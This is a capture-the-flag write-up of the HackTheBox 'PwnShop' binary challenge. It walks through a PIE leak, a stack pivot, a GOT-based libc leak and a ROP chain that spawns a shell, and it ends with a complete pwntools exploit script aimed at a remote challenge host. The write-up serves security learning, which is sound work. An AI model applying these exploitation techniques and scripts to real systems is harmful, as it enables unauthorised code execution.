@@ -1,0 +1,209 @@
+<div class="page-header">
+    <div class="page-header-inner">
+        <div class="page-header-inner2">
+            <h1>PWN/PwnShop - Easy</h1>
+            <h2>July 2021</h2>
+            <h4>Stack Pivot + Got Libc Leak</h4>
+        </div>
+    </div>
+</div>
+<H4>Problem</H4>
+<div class="paragraph">
+    <p>
+    We just opened a Pwn Shop, time to pwn all the things!
+    <br>
+    </p>
+</div>
+<H4>Solution</H4>
+<div class="paragraph">
+    <p>
+    	This challenge gives us a binary to download and develop the exploit for locally, and then an address to connect to remotely and retrieve the flag from using the developed exploit.
+        <br>
+    	So far going through the htb pwn retired challenges, this has been my favorite from the list. It came with pie and nx enabled, so we needed multiple leaks to finally craft a working exploit.<br> There are 3 functions that are interesting to us in this binary. As in some of the previous challenges, all the main does is run in an infinite loop and execute one of 2 functions depending on the users input. Func_1() is fairly short. After printing some error messages it reads in 0x50 bytes into a local buffer. The interesting part about this function is that this read() actually contains a buffer overflow vulnerability. Unfortunately since both pie and aslr are enabled, we need to continue looking for leaks first before attempting to exploit this overflow. 
+    	<br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/hackthebox/pwnshop1.png" alt="">
+</div>
+<div>
+    <img src="../imgs/hackthebox/pwnshop2.png" alt="">
+</div>
+<div class="paragraph">
+    <p>
+        <br><br>
+        Lets now look at func_2() and search for a vulnerability that may allow us to get a leak. This function is actually quite long in comparison with the rest of the binary. It starts off by asking us for information on the item we are looking to sell, and then depending on if our  price is $13.37 or not, it either prints our price back out to us or allows us to write 0x40 bytes to a variable in the data section. 
+        <br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/hackthebox/pwnshop3.png" alt="">
+</div>
+<div class="paragraph">
+    <p>
+        <br><br>
+        As it turns out, the only relevant part of this to us is the print. Since it does not nullterminate our string, we can send in 8 bytes. This will leave the stack in a state of 16 continous bytes at the 'printf("%s")' call. The first 8 of those bytes are our string and the second 8 bytes contain address from the binary that can be used to calculate the binary's base address thus beating pie. 
+        <br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/hackthebox/pwnshop4.png" alt="">
+</div>
+<div class="paragraph">
+    <p>
+        <br><br>
+        Now that we have pie leaked, we have access to quite a few rop gadgets, so we can actually start using the previously found buffer overflow now. Unfortunately these gadgets are not enough to spawn a shell in this case so we will also need a libc leak. We can achieve this using the got & plt which we can now access due to our pie leak. <br> 'chain = pop_rdi + PUTS_GOT + PUTS_PLT + main' <br> This will call puts(&puts) and thus leak a valid libc address. Attempting to add this chain to the end of our overflow buffer however fails. As it turns out we have to work with a very limited overflow. We have enough to overwrite rip but nothing further. This means that we need to pivot the stack to a suitable address. <br><br>
+        At this point I initially thought about the write we can make to the data section. My idea was to place my chain there, and redirect execution to that location. However this ended up not being feasible. We do not have control over any registers that we could point to the data section to accomplish this. Fortunately for us however, the binary included a very useful gadget: 'sub rsp, 0x28'. This would decrease rsp by 40 bytes, thus pointing it into the middle of our padding towards the overflow. 
+        <br><br>
+    </p>
+</div>
+<div>
+    <style 
+        type="text/css">
+            pre code {
+                      background-color: #008080;
+                      border: 1px solid #999;
+                      display: block;
+                      padding: 15px;
+                      color:  #F5F5DC;
+                    }
+    </style>
+    <pre>
+        <code>
+chain = pop_rdi + PUTS_GOT + PUTS_PLT + main            #This chain will leak libc using got
+payload = b'A'*40 + chain + sub_rsp_40                  #Execute 'sub rsp, 0x28' to pivot to chain due to limited stack space
+        </code>
+    </pre>
+</div>
+<div class="paragraph">
+    <p>
+        <br><br>
+        This payload will first overflow into rip, overwriting it with our sub rsp gadget, which will then pivot the stack onto our chain that will leak a libc address. Finally we will redirect execution back towards main so that we can hopefully abuse this vulnerability again to spawn a shell using our leaks. <br> Since the challenge did not come with a provided libc, we now need to first figure out which libc we are dealing with. The leak that we get running our exploit on remote indicated that the address of puts() ends in 0x6a0 on remote. Using libc.blukat, we get 3 possible options for the problems libc. I decided to chose the newer 64 bit version since that appeared to be the most likely candidate. 
+        <br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/hackthebox/pwnshop5.png" alt="">
+</div>
+<div class="paragraph">
+    <p>
+        <br><br>
+        After downloading the libc, we can use a tool called ctfmate to automatically download a linker and patch the binary to include the custom libc.
+        <br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/hackthebox/pwnshop6.png" alt="">
+</div>
+<div class="paragraph">
+    <p>
+        <br><br>
+        After all these steps we finally have everything needed to craft our final payload. There is unfortunately just one more small bug causing some issues. After returning to main, entering '1' no longer displays the first option. Instead we now need to provide '-1' to access it. I am not sure why exactly this is the case here, however restarting the binary from main sometimes causes weird issues so I decided not to dive deeper into the issue.<br> With this last hurdle out of the way, we can craft a similar payload as we did to get our libc leak and cause another overflow, just this time calling system('/bin/sh') to spawn a shell.
+        <br><br>
+    </p>
+</div>
+<div>
+    <style 
+        type="text/css">
+            pre code {
+                      background-color: #008080;
+                      border: 1px solid #999;
+                      display: block;
+                      padding: 15px;
+                      color:  #F5F5DC;
+                    }
+    </style>
+    <pre>
+        <code>
+shell = pop_rdi + binsh + ret + system                  #This chain will execute system('/bin/sh')
+payload = b'A'*40 + shell + sub_rsp_40                  #Execute 'sub rsp, 0x28' to pivot to chain due to limited stack space#
+        </code>
+    </pre>
+</div>
+<div class="paragraph">
+    <p>
+        <br><br>
+        This ends up working out perfectly and gives us a shell allowing us to retrieve the flag. The full exploit is posted below. 
+        <br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/hackthebox/pwnshop7.png" alt="">
+</div>
+<div>
+    <style 
+        type="text/css">
+            pre code {
+                      background-color: #008080;
+                      border: 1px solid #999;
+                      display: block;
+                      padding: 15px;
+                      color:  #F5F5DC;
+                    }
+    </style>
+    <pre>
+        <code>
+#!/usr/bin/env python
+
+from pwn import *
+elf = context.binary = ELF('./vuln')
+libc = elf.libc
+
+local = True
+
+if local:
+    p = elf.process()
+else:
+    host = '188.166.173.208'
+    port = 30840
+    p = remote(host,port)
+
+def leak_pie():
+    p.sendlineafter('>', '2')
+    p.sendlineafter('sell', 'A')
+    p.sendlineafter('it?', 'A'*7)
+    p.recvline()
+    data = p.recvline().strip()[:-29]
+    leak = u64(data.ljust(8,b"\x00")) - 0x40c0
+    return leak
+
+def leak_libc(payload):
+    p.clean()
+    p.sendline('1')
+    p.sendline(payload)
+    p.recvuntil('details: ')
+    data = p.recvline().strip()
+    leak = u64(data.ljust(8,b"\x00")) - libc.sym['puts']
+    return leak
+
+elf.address = leak_pie()                                #String isnt null terminated which can be used to get a leak
+print('[+] Elf Address is ' + str(hex(elf.address)))    
+
+PUTS_PLT = p64(elf.plt['puts'])                         #A bunch of useful Gadgets
+PUTS_GOT = p64(elf.got['puts'])
+pop_rdi = p64(elf.address + 0x13c3)
+ret = p64(elf.address + 0x101a)
+main = p64(elf.address + 0x10a0)
+sub_rsp_40 = p64(elf.address + 0x1219)
+
+chain = pop_rdi + PUTS_GOT + PUTS_PLT + main            #This chain will leak libc using got
+payload1 = b'A'*40 + chain + sub_rsp_40                 #Execute 'sub rsp, 0x28' to pivot to chain due to limited stack space
+
+libc.address = leak_libc(payload1)
+print('[+] Libc Address is ' + str(hex(libc.address)))
+
+binsh = p64(next(libc.search(b'/bin/sh\x00')))
+system = p64(libc.sym['system'])#
+
+shell = pop_rdi + binsh + ret + system                  #This chain will execute system('/bin/sh')
+payload2 = b'A'*40 + shell + sub_rsp_40                 #Execute 'sub rsp, 0x28' to pivot to chain due to limited stack space
+
+p.sendline('-1')
+p.sendline(payload2)
+
+p.interactive()
+        </code>
+    </pre>
+</div>
+<br><br>
+<script>try {pageOpenedDirectly;} catch(e) {var loc = window.location.pathname;var dir = loc.substring(0, loc.lastIndexOf('/'));dir = dir.split("/")[dir.split("/").length-1];let currentLoc = location.href;let currentFile = location.href.split("/").slice(-1);currentLoc = currentLoc.replace(currentFile,"");currentLoc = currentLoc.replace(dir,"");currentLoc = currentLoc.slice(0, -1);if (currentFile[0].indexOf(".html") !== -1) currentFile = currentFile[0].slice(0, -5);window.location = currentLoc+"?p="+currentFile+"&d="+dir;}</script>
